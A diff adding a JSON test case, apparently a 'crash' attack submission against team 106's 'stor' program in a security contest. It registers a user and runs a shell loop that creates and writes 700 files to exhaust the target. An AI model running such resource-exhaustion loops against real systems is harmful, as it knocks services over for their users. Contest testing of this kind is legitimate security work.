@@ -1,0 +1,23 @@
+{
+  "target_team": 106,
+  "type": "crash",
+  "commands": [
+    {
+      "program": "stor",
+      "args": [
+        "-u",
+        "bomber",
+        "-k",
+        "k",
+        "register"
+      ]
+    },
+    {
+      "program": "sh",
+      "args": [
+        "-c",
+        "i=1; while [ $i -le 700 ]; do ./stor -u bomber -f f$i create >/dev/null 2>&1 || exit 1; ./stor -u bomber -k k -f f$i write x >/dev/null 2>&1 || exit 1; i=$((i+1)); done"
+      ]
+    }
+  ]
+}
